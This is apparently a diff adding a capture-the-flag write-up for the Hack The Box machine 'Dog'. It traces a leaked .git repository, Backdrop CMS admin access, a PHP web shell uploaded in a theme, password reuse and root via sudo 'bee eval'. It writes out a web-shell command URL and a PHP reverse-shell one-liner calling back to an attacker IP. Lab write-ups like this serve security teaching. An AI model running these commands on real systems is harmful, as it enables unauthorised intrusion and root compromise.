@@ -1,0 +1,87 @@
+Title: Dog
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Dog was a Linux box built around a Backdrop CMS site fronted by Apache. A leaked `.git` repository exposed the site's `settings.php`, revealing database credentials and a hash salt. Digging through git commit history surfaced a username tied to an internal email address, which led to admin panel access. Backdrop CMS's theme upload feature then allowed a malicious theme package containing a PHP web shell to be installed, giving code execution as the web server user. From there, MySQL credentials pulled from `settings.php` were used to dump the site's user table, and password reuse between two differently named accounts allowed pivoting to a local user over SSH. A permissive sudo rule for Backdrop's `bee` CLI tool allowed arbitrary PHP evaluation as root, giving a root shell.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.58
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV --script vuln -p22,80 10.10.11.58
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
+| http-git:
+|   10.10.11.58:80/.git/
+|     Git repository found!
+|_    Last commit message referenced customizing url aliases, with a link to Backdrop's docs.
+```
+
+Nikto identified the site as Backdrop CMS 1 via the `x-generator` header, and flagged directory listing on `/core/`, `/files/`, `/sites/`, and `/themes/`, along with an exposed `/.git/HEAD` and `/.git/config`. `robots.txt` disclosed several login and admin-adjacent paths.
+
+## Failed Enumeration Attempts
+
+Since the login page returned a distinct "unrecognized username" error, username brute forcing looked promising, but running hydra against common username wordlists (both default CIRT usernames and a general names list) turned up nothing. Attempts at SQL injection against the login form's `q` parameter and POST body with sqlmap, including tamper scripts and high risk/level settings, also came up empty. An XSS sweep with xsser found nothing exploitable either.
+
+## Git Repository Disclosure
+
+With direct exploitation attempts stalled, the exposed `.git` directory was pulled down with git-dumper, recovering the full site source. `settings.php` contained a hardcoded MySQL connection string with root credentials, along with Backdrop's `hash_salt` value used when hashing user passwords. Searching the recovered history for the site's domain turned up a commit authored by an address at `dog.htb`, revealing the username `tiffany`.
+
+## Gaining Admin Access
+
+Logging into the Backdrop admin panel using the `tiffany` username together with the password recovered from `settings.php` succeeded, granting full admin dashboard access.
+
+## Foothold - Backdrop CMS Theme Upload RCE
+
+Backdrop CMS 1.22.0 has a known unrestricted file upload vulnerability in its theme installation feature, which accepts a packaged theme archive without adequately validating its contents. A legitimate theme was downloaded, a PHP web shell was added to it, and the archive was repackaged as a tarball (the format the admin upload form expected) and installed through the admin panel.
+
+The uploaded web shell was reachable directly under the theme's directory:
+
+```
+http://10.10.11.58/themes/bedrock-1.x-1.x/shell.php?cmd=whoami
+```
+
+Basic reverse shell payloads passed through the `cmd` parameter failed to connect back, so a PHP `proc_open`-based reverse shell (generated via revshells.com) was used instead through the same web shell, successfully catching a shell as the web server user. A PTY was spawned with `python3 -c 'import pty; pty.spawn("/bin/bash")'` to stabilize it.
+
+The user flag lived under `/home/johncusack`, which was not readable by the web server account, so further access was needed.
+
+## Lateral Movement - MySQL Credential Reuse
+
+Running linpeas from the web shell's foothold showed MySQL bound locally on ports 3306 and 33060. Logging in with the root MySQL credentials recovered from `settings.php` worked, exposing the `backdrop` database. The `users` table contained a set of Backdrop-format password hashes (prefixed `$S$`), a hash scheme inherited from Drupal.
+
+Cracking attempts with hashcat against rockyou.txt directly failed, since Backdrop/Drupal appends a per-site salt to the password before hashing. After confirming from Backdrop's own documentation that the salt is appended to the plaintext password, the recovered `hash_salt` from `settings.php` was appended to every entry in rockyou.txt to build a custom wordlist, but this also failed to crack the target hashes.
+
+Ultimately the working approach was simpler: password reuse. The password already recovered for the `tiffany` account also worked for the `johncusack` (`john`) account despite the two usernames looking unrelated, giving SSH access.
+
+```
+> ssh johncusack@10.10.11.58
+```
+
+## Privilege Escalation Attempts (Failed)
+
+CVE-2021-3560, a polkit/dbus authentication bypass in `org.freedesktop.Accounts` that relies on winning a race during the `CreateUser` D-Bus call, was attempted using `dbus-send`. The timing window used in public exploit code didn't line up with how quickly the call completed on this host, and attempts to create a new privileged user this way did not succeed.
+
+## Privilege Escalation - sudo bee eval (Root)
+
+Checking `sudo -l` as `johncusack` showed permission to run `bee`, Backdrop CMS's command-line administration tool, as root. `bee` has an `eval` subcommand that executes arbitrary PHP, but it must be run from Backdrop's installation directory to pick up the site context, which was `/var/www/html`.
+
+```
+> cd /var/www/html
+> sudo bee eval '$sock=fsockopen("10.10.15.0",443);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+```
+
+With a netcat listener running, this produced a root shell, and a PTY was again spawned for stability to read `/root/root.txt`.
+
+## Takeaways
+
+- Leftover `.git` directories on production web roots are a direct path to source code, configuration secrets, and password hashing salts, all of which can be pulled at once with tools like git-dumper.
+- Git commit history can leak more than code: author email addresses and commit messages often reveal valid usernames or internal naming conventions useful for later steps.
+- CMS theme/plugin upload features are a recurring RCE vector when the platform doesn't strictly validate uploaded archive contents, as with the Backdrop CMS 1.22.0 unrestricted theme upload issue.
+- Password reuse across accounts with unrelated-looking usernames remains an effective pivot, even when direct hash cracking (including salted wordlist attacks) fails.
+- Overly permissive sudo rules for CLI tools that support arbitrary code evaluation, such as Backdrop's `bee eval`, are a direct root-equivalent code execution primitive once a low-privileged shell is obtained.
